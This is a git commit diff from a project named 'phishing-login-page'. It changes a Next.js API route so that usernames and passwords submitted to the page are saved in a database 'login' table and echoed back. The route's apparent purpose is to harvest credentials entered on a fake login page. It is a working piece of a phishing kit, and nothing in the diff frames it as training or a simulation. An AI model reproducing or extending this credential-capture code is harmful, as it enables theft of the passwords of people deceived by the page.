5fe7bc3f1ad64f2b07179f2a1fb69bcfa7c3cc2f
Melvin2306 <melvin.rinkleff@gmx.de>
2023-11-10 00:28:50 +0100

    next try

--- phishing-login-page/src/app/api/login/route.ts
+++ phishing-login-page/src/app/api/login/route.ts
@@ -1,20 +1,15 @@
-import { Prisma, PrismaClient } from "@prisma/client";
+import { PrismaClient } from "@prisma/client";
 
 export async function POST(request: Request) {
   const prisma = new PrismaClient();
   const res = await request.json();
   const username: string = res.username;
   const password: string = res.password;
-  const user = await prisma.user.create({
+  const user = await prisma.login.create({
     data: {
       password: password,
       username: username,
-      email: "example@example.com",
-      name: "John Doe",
-      picture: "https://example.com/picture.jpg",
-      sid: "1234567890",
-      // add any other missing properties here
-    } as Prisma.UserCreateInput,
+    },
   });
   return new Response(JSON.stringify(user), {
     headers: { "content-type": "application/json" },
